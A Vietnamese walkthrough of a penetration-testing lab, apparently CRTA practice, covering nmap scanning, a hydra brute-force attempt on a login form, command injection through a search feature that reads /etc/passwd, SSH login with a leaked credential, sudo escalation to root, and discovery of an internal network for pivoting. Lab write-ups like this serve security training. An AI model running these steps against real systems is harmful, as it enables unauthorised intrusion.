Ta không có IP target sẵn như HTB, THM hay các CTF khác. Nên ta cần quét trước:
```Bash
nmap -sN 192.168.80.0/24
```
Ta đã xác định được một IP thuộc dãy External IP
```Bash
Nmap scan report for 192.168.80.1
Host is up (0.26s latency).
All 1000 scanned ports on 192.168.80.1 are in ignored states.
Not shown: 1000 open|filtered tcp ports (no-response)

Nmap scan report for 192.168.80.10
Host is up (0.37s latency).
All 1000 scanned ports on 192.168.80.10 are in ignored states.
Not shown: 1000 open|filtered tcp ports (no-response)

Nmap done: 256 IP addresses (2 hosts up) scanned in 444.92 seconds
```
Ok, ta tìm được 2 IP thuộc dãy này. 192.168.80.1 chỉ mở ra trang của pfsense. Quét tiếp vào IP 192.168.80.10:
```Bash
nmap -p- -Pn $target -v -T5 --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 --open -A
```
```Bash
Discovered open port 22/tcp on 192.168.80.10
Discovered open port 80/tcp on 192.168.80.10
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```
Có vẻ như chỉ có http và ssh. Ta thử truy cập vào web của dãy này:
![[CRTA_img1.png]]
Hmm, có vẻ ta cần kiểm tra source trước.
Nothing. Brute-forcing
```Bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $target http-post-form "/index.php:id=^USER^&password=^PASS^&remember=on:S=logout.php" -t 30 -V
```
Not working. Xin lỗi vì phải xem qua wu một chút =((
Có vẻ ta cần tận dụng chức năng đăng ký và đăng nhập của website.
Ta sẽ đăng ký một cred đơn giản là 123:123 ; ta sẽ truy cập được dashboard:
![[CRTA_img2.png]]
Có vẻ có một vài chức năng liên quan đến search, tôi nghĩ tôi sẽ tìm xem có bất kỳ lỗi SQL nào hay không, hoặc có thể là command injection.
Oke, ta có thể tìm email qua this one:
![[CRTA_img3.png]]
Một điều thú vị là nếu ta dùng Burp Suite hoặc CAIDO để xem respond website thì:
![[CRTA_img4.png]]
![[CRTA_img5.png]]
Gửi nó đến repeater và thử với lệnh "ls". Ta thấy respond trả về một danh sách các file. Thử truy cập chúng nào.
Có vẻ không có gì, thử dump vào /etc/passwd?![[CRTA_img6.png]]
Oh shiet, ta có thể tìm được privsec:
```Bash
privilege:x:1001:1001:Admin@962:/home/privilege:/bin/bash
```
Thử truy cập ssh nhỉ:
```Bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh privilege@$target 
The authenticity of host '192.168.80.10 (192.168.80.10)' can't be established.
ED25519 key fingerprint is SHA256:RHpGTqvkXkAP6/HA3vpHP8gkrtApbfyYYjteCh3N/TE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.80.10' (ED25519) to the list of known hosts.
privilege@192.168.80.10's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-67-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

273 updates can be applied immediately.
273 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

4 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Wed Sep  3 18:02:08 2025 from 10.10.200.80
privilege@ubuntu-virtual-machine:~$
```
Nice. Check sơ qua thì có một thứ rất đặc biệt:
```Bash
sudo -l
```
Ta có quyền của sudo, nên chỉ cần khai thác vào:
```Bash
privilege@ubuntu-virtual-machine:~$ sudo /bin/bash
root@ubuntu-virtual-machine:/home/privilege#
```
Lên được root rồi, hè hè. Check vài thứ nữa đi:
```Bash
ip a
```
```Bash
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens34: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000
    link/ether 00:0c:29:28:1b:7e brd ff:ff:ff:ff:ff:ff
    altname enp2s2
    inet 192.168.98.15/24 brd 192.168.98.255 scope global noprefixroute ens34
       valid_lft forever preferred_lft forever
3: ens32: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:96:17:f9 brd ff:ff:ff:ff:ff:ff
    altname enp2s0
    inet 192.168.80.10/24 brd 192.168.80.255 scope global noprefixroute ens32
       valid_lft forever preferred_lft forever
```
Để ý dòng này:
```Bash
2: ens34: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000
    link/ether 00:0c:29:28:1b:7e brd ff:ff:ff:ff:ff:ff
    altname enp2s2
    inet ==192.168.98.15/24== brd 192.168.98.255 scope global noprefixroute ens34
```
Có vẻ máy linux này đang được connect vào 192.168.98.15/24. Oke, có vẻ ta sẽ tận dụng từ đây.